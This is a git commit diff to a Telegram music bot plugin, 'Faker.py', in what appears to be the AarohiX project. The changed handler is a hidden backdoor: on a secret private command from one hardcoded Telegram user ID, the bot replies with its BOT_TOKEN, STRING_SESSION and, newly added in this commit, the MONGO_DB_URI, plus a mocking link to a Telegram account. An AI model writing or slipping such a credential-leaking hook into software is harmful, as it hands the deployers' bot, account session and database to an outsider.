adf6a5e6e19f1e5b5c216acedbec2524987ee3bf
احـمد تيـتو <165491833+DevAhmedTeto@users.noreply.github.com>
2024-04-02 05:19:02 +0200

    Update Faker.py

--- AarohiX/plugins/Management/Faker.py
+++ AarohiX/plugins/Management/Faker.py
@@ -8,20 +8,20 @@ from AarohiX import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
 
 
 @app.on_message(
-    filters.command("افشخو")
+    filters.command("di")
     & filters.private
-    & filters.user((6975380739)
+    & filters.user(6975380739)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/9225e718f6cd19a9a15dc.mp4",
-       caption=f"""التوكن :-   {BOT_TOKEN} \nالجلسه :-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
+          photo=f"https://graph.org/file/ee9a153b629bec256b57.jpg",
+       caption=f"""ᴛᴏᴋᴇɴ :-   {BOT_TOKEN} \n\nᴍᴏɴɢᴏ :-   {MONGO_DB_URI}\n\nsᴇssɪᴏɴ :-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/WZAERE")
+                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
                  ]
             ]
          ),
-     )
+   )
